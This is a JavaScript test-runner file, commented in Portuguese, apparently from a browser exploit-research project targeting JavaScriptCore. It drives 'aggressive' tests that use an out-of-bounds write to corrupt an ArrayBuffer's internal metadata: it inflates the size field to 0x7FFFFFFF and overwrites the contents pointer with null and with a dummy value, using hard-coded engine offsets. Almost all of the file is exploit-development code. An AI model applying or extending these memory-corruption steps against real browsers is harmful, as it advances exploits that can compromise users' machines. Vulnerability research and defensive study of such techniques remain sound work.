// js/script3/runAllAdvancedTestsS3.mjs
import { logS3, PAUSE_S3, MEDIUM_PAUSE_S3 } from './s3_utils.mjs';
import { getOutputAdvancedS3, getRunBtnAdvancedS3 } from '../dom_elements.mjs';
// Atualize para a nova função de teste e remova importações não usadas se houver
import { executeCorruptArrayBufferMetadataTest } from './testCorruptMetadata.mjs'; // Nome do arquivo e função atualizados
import { OOB_CONFIG, JSC_OFFSETS } from '../config.mjs'; 
import { AdvancedInt64, toHex } from '../utils.mjs'; // AdvancedInt64 pode ser necessário para ponteiros

async function runAggressiveMetadataCorruptionTests() {
    const FNAME_RUNNER = "runAggressiveMetadataCorruptionTests";
    logS3(`==== INICIANDO Testes Agressivos de Corrupção de Metadados de ArrayBuffer ====`, 'test', FNAME_RUNNER);

    // Teste 1: Tentar corromper o TAMANHO do oob_array_buffer_real
    // Assumindo que o objeto JSArrayBuffer começa no offset 0 da alocação oob_array_buffer_real
    const offsetCorromperTamanho = JSC_OFFSETS.ArrayBuffer.SIZE_IN_BYTES_OFFSET_FROM_JSARRAYBUFFER_START;
    // Verifique se este offset faz sentido. Se o JSCell header tiver, por exemplo, 16 bytes (vtable + Structure*),
    // e o JSObject (que herda de JSCell) tiver o butterfly em 0x10, então os campos de ArrayBuffer viriam depois disso.
    // O SIZE_IN_BYTES_OFFSET_FROM_JSARRAYBUFFER_START no seu config.mjs é 0x18.
    
    logS3(`\n--- Testando Corrupção de Tamanho do ArrayBuffer ---`, 'subtest', FNAME_RUNNER);
    await executeCorruptArrayBufferMetadataTest(
        "Corrupt_AB_Size_to_Large",
        offsetCorromperTamanho, // Ex: 0x18 (relativo ao início do objeto oob_array_buffer_real)
        0x7FFFFFFF,             // Novo tamanho grande (32-bit com sinal max)
        4                       // Tamanhos são geralmente 4 bytes (uint32 ou int32)
    );
    await PAUSE_S3(MEDIUM_PAUSE_S3);

    // Teste 2: Tentar corromper o PONTEIRO DE CONTEÚDO do oob_array_buffer_real (mais arriscado)
    // Assumindo que o objeto JSArrayBuffer começa no offset 0 da alocação oob_array_buffer_real
    const offsetCorromperConteudoPtr = JSC_OFFSETS.ArrayBuffer.CONTENTS_IMPL_POINTER_OFFSET;
    // Este offset é 0x10 no seu config.mjs. Ponteiros são geralmente de 8 bytes em sistemas 64-bit.
    
    logS3(`\n--- Testando Corrupção de Ponteiro de Conteúdo do ArrayBuffer (Anular) ---`, 'subtest', FNAME_RUNNER);
    await executeCorruptArrayBufferMetadataTest(
        "Corrupt_AB_ContentsPtr_to_Null",
        offsetCorromperConteudoPtr, // Ex: 0x10 (relativo ao início do objeto oob_array_buffer_real)
        new AdvancedInt64(0,0),   // Valor NULO para um ponteiro de 64 bits
        8                         // Ponteiros são 8 bytes
    );
    await PAUSE_S3(MEDIUM_PAUSE_S3);
    
    // Adicione mais testes aqui, por exemplo, escrever um ponteiro "dummy"
    logS3(`\n--- Testando Corrupção de Ponteiro de Conteúdo do ArrayBuffer (Dummy) ---`, 'subtest', FNAME_RUNNER);
    await executeCorruptArrayBufferMetadataTest(
        "Corrupt_AB_ContentsPtr_to_Dummy",
        offsetCorromperConteudoPtr, 
        new AdvancedInt64("0x4141414142424242"), // Ponteiro dummy
        8                        
    );
    await PAUSE_S3(MEDIUM_PAUSE_S3);


    logS3(`==== Testes Agressivos de Corrupção de Metadados CONCLUÍDOS ====`, 'test', FNAME_RUNNER);
}

export async function runAllAdvancedTestsS3() {
    const FNAME = 'runAllAdvancedTestsS3_AggressiveCorrupt';
    const runBtn = getRunBtnAdvancedS3();
    const outputDiv = getOutputAdvancedS3();

    if (runBtn) runBtn.disabled = true;
    if (outputDiv) outputDiv.innerHTML = '';

    logS3(`==== INICIANDO Script 3: Testes Agressivos de Corrupção de Metadados AB ====`,'test', FNAME);
    document.title = "Iniciando Script 3 - Corrupção Agressiva AB";
    
    await runAggressiveMetadataCorruptionTests();
    
    logS3(`\n==== Script 3 CONCLUÍDO (Testes Agressivos de Corrupção de Metadados AB) ====`,'test', FNAME);
    if (runBtn) runBtn.disabled = false;
}
